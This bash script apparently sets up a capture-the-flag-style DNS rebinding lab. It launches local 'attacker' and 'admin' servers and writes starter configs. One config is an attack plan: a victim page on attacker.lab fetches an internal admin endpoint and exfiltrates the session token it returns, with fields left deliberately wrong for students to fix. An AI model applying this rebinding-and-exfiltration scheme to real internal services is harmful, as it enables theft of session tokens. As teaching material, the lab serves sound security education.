#!/bin/bash
# LAB F Activity 2 -- DNS rebinding exploitation.
# Follows Section 4.6.9 multi-service init template.
# Do NOT use `set -e`.

LAB_DIR="/home/labDirectory"
EVAL_DIR="/home/.evaluationScripts"
INIT_DIR="$EVAL_DIR/activityInitiator"
RUNTIME_DIR="/opt/labf"
ACTIVITY_ID="2"
INIT_LOG="/tmp/labf_init.log"

echo "[$(date)] LAB F Activity 2 init start" > "$INIT_LOG"
echo "[$(date)] user=$(id -un 2>/dev/null), python=$(command -v python3)" >> "$INIT_LOG"

# === PART 1: INFRASTRUCTURE ===
sudo chmod 755 "$EVAL_DIR" "$INIT_DIR" 2>/dev/null || true
sudo chmod 666 "$EVAL_DIR/evaluate.json" 2>/dev/null || true
sudo chown -R student:student "$LAB_DIR" 2>/dev/null || true

for f in flag.txt; do
    sudo rm -f "$LAB_DIR/$f" 2>/dev/null || true
    : | sudo tee "$LAB_DIR/$f" > /dev/null
    sudo chown student:student "$LAB_DIR/$f" 2>/dev/null || true
    sudo chmod 666 "$LAB_DIR/$f" 2>/dev/null || true
done

# === PART 2: STAGE RUNTIME CODE ===
sudo mkdir -p "$RUNTIME_DIR"
sudo chown -R student:student "$RUNTIME_DIR" 2>/dev/null || true
cp "$INIT_DIR/attacker_server.py" "$RUNTIME_DIR/attacker_server.py"
cp "$INIT_DIR/admin_server.py"    "$RUNTIME_DIR/admin_server.py"
chmod +x "$RUNTIME_DIR/attacker_server.py" "$RUNTIME_DIR/admin_server.py" 2>/dev/null || true

# Starter configs the student fills in. Pre-populated with the bare scaffold;
# key fields are deliberately wrong so fixing them is the lesson.
cat > "$LAB_DIR/dns_config.json" <<'JSON'
{
  "_help": "Configure how the bot's resolver answers each hostname. First lookup -> initial_ip:initial_port; subsequent lookups -> rebind_ip:rebind_port.",
  "hostnames": [
    {
      "hostname": "attacker.lab",
      "initial_ip": "127.0.0.1",
      "initial_port": 30000,
      "rebind_ip": "127.0.0.1",
      "rebind_port": 30000,
      "rebind_after_request": 1,
      "_TODO": "rebind_port currently bounces back to the attacker server. Change it so the rebind hits the internal admin instead."
    }
  ]
}
JSON

cat > "$LAB_DIR/attack_plan.json" <<'JSON'
{
  "_help": "page_url fixes the page origin; victim_actions runs after, with same-origin policy enforced.",
  "page_url": "http://attacker.lab/payload",
  "victim_actions": [
    {
      "action": "fetch",
      "url": "http://attacker.lab/admin/welcome",
      "_TODO": "Change this URL to the admin endpoint that returns the session token."
    },
    { "action": "exfil", "data": "$last_response" }
  ]
}
JSON
chown student:student "$LAB_DIR/dns_config.json" "$LAB_DIR/attack_plan.json" 2>/dev/null || true
chmod 666 "$LAB_DIR/dns_config.json" "$LAB_DIR/attack_plan.json" 2>/dev/null || true

# Reset the dashboard event log so the student starts clean.
rm -f /tmp/labf_events.json 2>/dev/null || true

# === PART 3: KILL OLD INSTANCES ===
pkill -f admin_server.py    2>/dev/null || true
pkill -f attacker_server.py 2>/dev/null || true
sleep 1

# === PART 4: LAUNCH (Section 4.6.2) ===
echo "[$(date)] launching admin_server (127.0.0.1:8080)" >> "$INIT_LOG"
nohup python3 "$RUNTIME_DIR/admin_server.py" >/tmp/labf_admin.log 2>&1 &
disown 2>/dev/null || true
sleep 2

echo "[$(date)] launching attacker_server (0.0.0.0:30000)" >> "$INIT_LOG"
ACTIVITY_ID="$ACTIVITY_ID" nohup python3 "$RUNTIME_DIR/attacker_server.py" >/tmp/labf_attacker.log 2>&1 &
disown 2>/dev/null || true

# === PART 5: VERIFY ===
for i in $(seq 1 20); do
    listen=$(ss -ltn 2>/dev/null | grep -E ':(30000|8080)\b' || \
             netstat -ltn 2>/dev/null | grep -E ':(30000|8080)\b')
    if [ -n "$listen" ] && \
       echo "$listen" | grep -q ':30000' && \
       echo "$listen" | grep -q ':8080'; then
        break
    fi
    sleep 0.5
done
echo "[$(date)] services up:" >> "$INIT_LOG"
ss -ltn 2>/dev/null | grep -E ':(30000|8080)' >> "$INIT_LOG" || \
    netstat -ltn 2>/dev/null | grep -E ':(30000|8080)' >> "$INIT_LOG" || true
{ echo "--- admin log ---"; tail -20 /tmp/labf_admin.log 2>/dev/null;
  echo "--- attacker log ---"; tail -20 /tmp/labf_attacker.log 2>/dev/null; } >> "$INIT_LOG"

# === PART 6: LOCKDOWN ===
if [ -f /etc/sudoers.d/student_temp ]; then
    sudo rm -f /etc/sudoers.d/student_temp
fi
echo "[$(date)] init complete" >> "$INIT_LOG"

exit 0
